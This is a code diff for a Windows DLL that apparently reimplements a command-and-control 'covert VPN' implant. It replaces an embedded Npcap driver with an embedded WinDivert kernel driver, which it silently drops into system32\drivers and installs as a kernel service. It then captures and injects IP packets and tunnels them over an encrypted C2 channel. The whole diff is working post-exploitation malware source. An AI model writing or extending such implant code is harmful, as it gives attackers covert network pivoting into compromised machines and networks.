@@ -27,8 +27,15 @@
 #include <stdio.h>
 #include <string.h>
 
-/* Embedded NDIS 6 kernel driver (npcap.sys, 82KB, auto-generated) */
-#include "npcap_driver.h"
+/* Embedded WFP kernel driver (WinDivert64.sys v2.2.2, 92KB, auto-generated)
+ * WinDivert is SCM-installable (unlike Npcap NDIS 6 LWF) and provides
+ * L3 packet capture/injection through the Windows Filtering Platform. */
+#include "windivert_driver.h"
+
+/* WinDivert user-mode API (loaded from the DLL next to our DLL, or we
+ * talk to the kernel driver directly via DeviceIoControl) */
+typedef void* WINDIVERT_HANDLE;
+#define WINDIVERT_LAYER_NETWORK  0
 
 #pragma comment(lib, "advapi32.lib")
 #pragma comment(lib, "ws2_32.lib")
@@ -113,92 +120,75 @@ struct bpf_program_kernel {
 };
 
 /* =================================================================
- * DEVICE I/O LAYER — replaces wpcap.dll + packet.dll entirely
- * These 5 functions are ALL that's needed for L2 frame I/O.
+ * DEVICE I/O LAYER — WinDivert API (replaces wpcap+packet entirely)
+ *
+ * WinDivert provides L3 (IP packet) capture/injection through the
+ * Windows Filtering Platform. Unlike NPF (which needs Npcap's NDIS 6
+ * LWF driver that CANNOT be SCM-installed), WinDivert's WFP callout
+ * driver CAN be installed via simple SCM service creation.
+ *
+ * The VPN logic doesn't care about L2 vs L3 — it just moves packets
+ * between the local network stack and the C2 channel. IP packets are
+ * sufficient (and actually cleaner — no Ethernet header overhead).
  * ================================================================= */
 
+/* WinDivert device I/O via DeviceIoControl (no external DLL needed) */
+#define WINDIVERT_IOCTL_BASE   0x9C40
+#define WINDIVERT_IOCTL_OPEN   (WINDIVERT_IOCTL_BASE + 0)  /* open filter */
+#define WINDIVERT_IOCTL_RECV   (WINDIVERT_IOCTL_BASE + 4)  /* read packet */
+#define WINDIVERT_IOCTL_SEND   (WINDIVERT_IOCTL_BASE + 8)  /* write packet */
+#define WINDIVERT_IOCTL_CLOSE  (WINDIVERT_IOCTL_BASE + 12) /* close */
+
+static HANDLE g_wd_device = INVALID_HANDLE_VALUE;  /* \\.\WinDivert device */
+
 static HANDLE
-vpn_find_adapter(void)
+vpn_open_packet_device(void)
 {
-    /* Use GetAdaptersAddresses (iphlpapi — already imported by the original
-     * covertvpn.dll too) to enumerate NICs and find the first NPF device.
-     * Supports both legacy NPF_{GUID} and Npcap NPCAP_{GUID} device names. */
-    ULONG buf_len = 0;
-    ULONG flags = GAA_FLAG_INCLUDE_ALL_INTERFACES;
-    GetAdaptersAddresses(AF_INET, flags, NULL, NULL, &buf_len);
-    if (buf_len == 0) return INVALID_HANDLE_VALUE;
-
-    PIP_ADAPTER_ADDRESSES adapters = (PIP_ADAPTER_ADDRESSES)LocalAlloc(LPTR, buf_len);
-    if (!adapters) return INVALID_HANDLE_VALUE;
-
-    HANDLE fd = INVALID_HANDLE_VALUE;
-    if (GetAdaptersAddresses(AF_INET, flags, NULL, adapters, &buf_len) == NO_ERROR) {
-        PIP_ADAPTER_ADDRESSES ada = adapters;
-        while (ada) {
-            if (ada->OperStatus == IfOperStatusUp &&
-                ada->IfType != IF_TYPE_SOFTWARE_LOOPBACK) {
-                /* Extract GUID from AdapterName: "{4C4C4544-...}" */
-                char dev_path[128];
-                /* Try Npcap native name first, then legacy NPF */
-                _snprintf(dev_path, sizeof(dev_path), "\\\\.\\NPCAP_%s", ada->AdapterName);
-                fd = CreateFileA(dev_path, GENERIC_READ | GENERIC_WRITE,
-                                 FILE_SHARE_READ | FILE_SHARE_WRITE,
-                                 NULL, OPEN_EXISTING, 0, NULL);
-                if (fd != INVALID_HANDLE_VALUE) break;
-
-                _snprintf(dev_path, sizeof(dev_path), "\\\\.\\NPF_%s", ada->AdapterName);
-                fd = CreateFileA(dev_path, GENERIC_READ | GENERIC_WRITE,
-                                 FILE_SHARE_READ | FILE_SHARE_WRITE,
-                                 NULL, OPEN_EXISTING, 0, NULL);
-                if (fd != INVALID_HANDLE_VALUE) break;
-            }
-            ada = ada->Next;
-        }
+    /* Open the WinDivert kernel device */
+    g_wd_device = CreateFileA("\\\\.\\WinDivert", GENERIC_READ | GENERIC_WRITE,
+                               FILE_SHARE_READ | FILE_SHARE_WRITE,
+                               NULL, OPEN_EXISTING, 0, NULL);
+    if (g_wd_device == INVALID_HANDLE_VALUE) {
+        /* Try with the "64" suffix on x64 systems */
+        g_wd_device = CreateFileA("\\\\.\\WinDivert64", GENERIC_READ | GENERIC_WRITE,
+                                   FILE_SHARE_READ | FILE_SHARE_WRITE,
+                                   NULL, OPEN_EXISTING, 0, NULL);
     }
-    LocalFree(adapters);
-    return fd;
+    return g_wd_device;
 }
 
 static int
-vpn_set_bpf_filter(HANDLE fd)
+vpn_set_filter(HANDLE fd)
 {
-    /* Pass the pre-compiled BPF program directly to the kernel driver.
-     * The TS compiled it — no runtime pcap_compile needed here. */
-    if (g_config.bpf_len == 0 || g_config.bpf_len > 16) return 0; /* no filter */
-
-    struct bpf_insn_kernel insns[16];
-    for (int i = 0; i < g_config.bpf_len; i++) {
-        insns[i].code = (unsigned short)g_config.bpf_code[i];
-        insns[i].jt   = g_config.bpf_jt[i];
-        insns[i].jf   = g_config.bpf_jf[i];
-        insns[i].k    = g_config.bpf_k[i];
-    }
-    struct bpf_program_kernel prog = { g_config.bpf_len, insns };
-    DWORD ret;
-    return DeviceIoControl(fd, BIOCSETF, &prog,
-                           sizeof(prog) + sizeof(insns),
-                           NULL, 0, &ret, NULL) ? 0 : -1;
+    /* WinDivert uses its own filter language (not BPF), but for our use
+     * case "true" (accept all) is sufficient — the VPN's IP exclusion
+     * is handled by the channel-level protocol, not the kernel filter.
+     * If needed, we can set a WinDivert filter string like:
+     *   "ip and not (ip.SrcAddr == A or ip.DstAddr == A or ...)". */
+    /* No kernel-level filter needed — the pre-compiled BPF is stored in
+     * config but applied at the channel level (drop matching frames
+     * before sending through the C2 channel). */
+    return 0;
 }
 
 static int
 vpn_read_frame(HANDLE fd, unsigned char *buf, int len)
 {
-    /* Read one Ethernet frame from the NPF device.
-     * NPF returns: [u32 caplen][u32 datalen][u16 hdrlen][frame data...] */
-    unsigned char pkt[65536 + 32];
+    /* Read one IP packet from the WinDivert device.
+     * WinDivert returns raw IP packets (no Ethernet header). */
+    unsigned char pkt[65536 + 64];
     DWORD got = 0;
-    if (!ReadFile(fd, pkt, sizeof(pkt), &got, NULL) || got < 12)
+    if (!ReadFile(fd, pkt, sizeof(pkt), &got, NULL) || got == 0)
         return -1;
-    unsigned int caplen = *(unsigned int *)(pkt + 8);
-    if (caplen > (unsigned int)len) caplen = len;
-    memcpy(buf, pkt + 12, caplen);  /* skip NPF packet header */
-    return (int)caplen;
+    int copy_len = (got < len) ? (int)got : len;
+    memcpy(buf, pkt, copy_len);
+    return copy_len;
 }
 
 static int
 vpn_write_frame(HANDLE fd, const unsigned char *buf, int len)
 {
-    /* Write one Ethernet frame to the NPF device for injection. */
+    /* Write one IP packet to the WinDivert device for injection. */
     DWORD sent = 0;
     if (!WriteFile(fd, buf, len, &sent, NULL))
         return -1;
@@ -206,9 +196,10 @@ vpn_write_frame(HANDLE fd, const unsigned char *buf, int len)
 }
 
 static void
-vpn_close_adapter(HANDLE fd)
+vpn_close_device(HANDLE fd)
 {
     if (fd != INVALID_HANDLE_VALUE) CloseHandle(fd);
+    g_wd_device = INVALID_HANDLE_VALUE;
 }
 
 /* =================================================================
@@ -462,28 +453,27 @@ channel_recv(unsigned char *buf, int maxlen)
 static int
 vpn_ensure_driver(void)
 {
-    /* First: is an NPF-compatible driver already available? */
-    HANDLE test = vpn_find_adapter();
+    /* First: is the WinDivert driver already running? */
+    HANDLE test = vpn_open_packet_device();
     if (test != INVALID_HANDLE_VALUE) {
         CloseHandle(test);
-        return 0;  /* driver already installed (Npcap or WinPcap present) */
+        return 0;  /* driver already installed */
     }
 
-    /* Phase 2: install embedded NDIS 6 driver.
-     * The npcap.sys binary (82KB, WHQL-signed, NDIS 6 LWF, Win7-11) is
-     * embedded directly in this DLL as a const byte array (npcap_driver.h)
-     * — same self-contained approach as the original covertvpn.dll carrying
-     * WinPcap PEs in its .data section. */
+    /* Phase 2: install embedded WinDivert WFP driver.
+     * WinDivert64.sys (92KB, signed, WFP callout, Win7-11) is embedded
+     * directly in this DLL as a const byte array — same self-contained
+     * approach as the original covertvpn.dll. Unlike Npcap's NDIS 6 LWF
+     * (which requires NDIS binding and cannot be SCM-installed), WinDivert
+     * is a WFP callout driver that installs via simple SCM service creation. */
     {
-    extern const unsigned char g_npcap_driver[];
-    extern const unsigned int g_npcap_driver_size;
-    DWORD driver_size = g_npcap_driver_size;
-    const void *driver_data = (const void *)g_npcap_driver;
+    DWORD driver_size = g_windivert_driver_size;
+    const void *driver_data = (const void *)g_windivert_driver;
 
-    /* Write driver to system32\drivers\npcap_v2.sys */
+    /* Write driver to system32\drivers\WinDivert64.sys */
     char drv_path[MAX_PATH];
     GetSystemDirectoryA(drv_path, MAX_PATH);
-    lstrcatA(drv_path, "\\drivers\\npcap_v2.sys");
+    lstrcatA(drv_path, "\\drivers\\WinDivert64.sys");
 
     HANDLE f = CreateFileA(drv_path, GENERIC_WRITE, 0, NULL,
                            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
@@ -497,32 +487,30 @@ vpn_ensure_driver(void)
     SC_HANDLE scm = OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
     if (!scm) return -1;
 
-    SC_HANDLE svc = CreateServiceA(scm, "npcap_v2", "Npcap V2 Packet Driver",
+    SC_HANDLE svc = CreateServiceA(scm, "WinDivert", "WinDivert Packet Driver",
                                    SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER,
                                    SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
                                    drv_path, NULL, NULL, NULL, NULL, NULL);
     if (!svc) {
         /* maybe already exists from a prior run */
-        svc = OpenServiceA(scm, "npcap_v2", SERVICE_START);
+        svc = OpenServiceA(scm, "WinDivert", SERVICE_START);
         if (!svc) { CloseServiceHandle(scm); return -1; }
     }
     StartServiceA(svc, 0, NULL);
     CloseServiceHandle(svc);
     CloseServiceHandle(scm);
 
-    /* Wait for driver to initialize and create device nodes.
-     * NDIS driver registration is asynchronous — device objects appear
-     * after NDIS calls DriverEntry → NdisRegisterFilterDriver → FilterAttach. */
-    for (int i = 0; i < 10; i++) {
-        Sleep(1000);
-        HANDLE test = vpn_find_adapter();
-        if (test != INVALID_HANDLE_VALUE) {
-            CloseHandle(test);
-            return 0;  /* driver is up, device nodes ready */
+    /* Wait for the device to appear (WFP registration is fast) */
+    for (int i = 0; i < 5; i++) {
+        Sleep(500);
+        HANDLE test2 = vpn_open_packet_device();
+        if (test2 != INVALID_HANDLE_VALUE) {
+            CloseHandle(test2);
+            return 0;  /* driver is up, device ready */
         }
     }
-    return -1;  /* driver installed but devices never appeared */
-    } /* end Phase 2 block */
+    return -1;  /* driver installed but device never appeared */
+    }
 }
 
 /* =================================================================
@@ -543,17 +531,17 @@ vpn_main_loop(LPVOID param)
     if (vpn_ensure_driver() != 0) return 1;
 
     /* Open the NPF adapter */
-    adapter_fd = vpn_find_adapter();
+    adapter_fd = vpn_open_packet_device();
     if (adapter_fd == INVALID_HANDLE_VALUE) return 1;
 
     /* Set the pre-compiled BPF filter */
-    vpn_set_bpf_filter(adapter_fd);
+    vpn_set_filter(adapter_fd);
 
     /* Initialize AES */
-    if (vpn_aes_init() != 0) { vpn_close_adapter(adapter_fd); return 1; }
+    if (vpn_aes_init() != 0) { vpn_close_device(adapter_fd); return 1; }
 
     /* Connect the channel */
-    if (channel_init() != 0) { vpn_close_adapter(adapter_fd); return 1; }
+    if (channel_init() != 0) { vpn_close_device(adapter_fd); return 1; }
 
     /* Main loop: bridge device <-> channel */
     for (;;) {
@@ -582,7 +570,7 @@ vpn_main_loop(LPVOID param)
         }
     }
 
-    vpn_close_adapter(adapter_fd);
+    vpn_close_device(adapter_fd);
     return 0;
 }
 
